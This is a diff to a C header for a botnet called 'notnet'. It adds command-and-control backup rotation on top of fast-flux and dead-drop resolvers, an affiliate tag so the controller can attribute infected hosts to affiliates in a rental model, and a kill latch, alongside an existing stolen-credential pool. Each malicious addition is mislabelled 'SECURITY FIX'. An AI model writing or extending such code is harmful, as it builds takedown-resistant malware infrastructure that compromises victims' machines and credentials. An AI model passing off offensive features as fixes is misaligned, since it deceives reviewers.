@@ -179,6 +179,42 @@ typedef struct {
      * config_set key. */
     uint8_t plugin_enabled;
 
+    /* SECURITY FIX (#93): Disposable-infrastructure C2 rotation. A
+     * bounded backup chain (c2_backup_1..4, each "host:port")
+     * layered ABOVE the flux resolver (#85) — flux rotates IPs
+     * within one hostname, rotation switches the whole HTTP endpoint.
+     * After C2_ROTATE_FAIL_THRESHOLD consecutive primary-channel
+     * connect failures the bot advances c2_rot_index through
+     * [primary, backup_1..N], logging each switch, until
+     * C2_ROTATE_MAX total rotations (no infinite churn). Index 0
+     * always reads the live c2_http fields, so a dead-drop repoint
+     * (#86) is honored immediately (and resets the failure streak —
+     * a fresh drop gets a fair chance before any static backup
+     * applies). c2_backup_count is the length of the contiguous
+     * prefix of the list, c2_fail_streak the consecutive-failure
+     * counter. */
+    char c2_backup[C2_BACKUP_MAX][C2_BACKUP_STR_MAX];
+    uint8_t c2_backup_count;
+    uint8_t c2_rot_index;      /* 0 = primary, 1..N = backup slot */
+    uint8_t c2_fail_streak;
+    uint8_t c2_rotations;
+
+    /* SECURITY FIX (#93): Affiliate/operator tag — the affiliate-model
+     * primitive. A short (<= BOT_TAG_MAX) operator or campaign
+     * identifier set via bot_tag= config (or the `bot_tag` config_set
+     * key), reported in every heartbeat so the C2 can attribute bots
+     * to affiliates (per-affiliate inventory, per-affiliate teardown)
+     * and hand back capacity with `kill` without touching other
+     * affiliates' hosts. Empty = unattributed. */
+    char bot_tag[BOT_TAG_MAX];
+
+    /* SECURITY FIX (#93): `kill` command latch. Set by the dispatch
+     * loop after wiping the cred buffer and stopping proxy/relay/
+     * plugin stop callbacks; the main loop breaks on it so cleanup
+     * (lock removal, log flush) runs and main returns EXIT_SUCCESS
+     * (exit code 0). One-way door — no un-kill. */
+    uint8_t kill_pending;
+
     /* Credentials */
     notnet_cred_t cred_pool[CRED_POOL_MAX];
     int cred_count;
@@ -322,5 +358,21 @@ void tls_cleanup(void);
 
 /* ── Config ─────────────────────────────────────────────────── */
 int load_config(notnet_bot_t *bot, const char *path);
+
+/* ── Disposable-Infrastructure C2 Rotation (#93) ─────────────── */
+/* Report the outcome of a primary-channel attempt. success=1 resets
+ * the consecutive-failure streak; success=0 increments it and rotates
+ * to the next endpoint once C2_ROTATE_FAIL_THRESHOLD is hit (capped
+ * at C2_ROTATE_MAX total rotations). Called by the HTTP connect path. */
+void c2_rotation_note_result(notnet_bot_t *bot, int success);
+
+/* Manual `rotate` command: advance the chain immediately (operator
+ * intent — does not consume the automatic-churn budget). */
+void c2_rotation_manual(notnet_bot_t *bot);
+
+/* A dead-drop repoint (#86) changed the primary endpoint under us:
+ * reset the failure streak and return to the primary so the fresh
+ * drop is tried before any static backup applies. */
+void c2_rotation_note_repoint(notnet_bot_t *bot);
 
 #endif /* NOTNET_PROTOCOL_H */
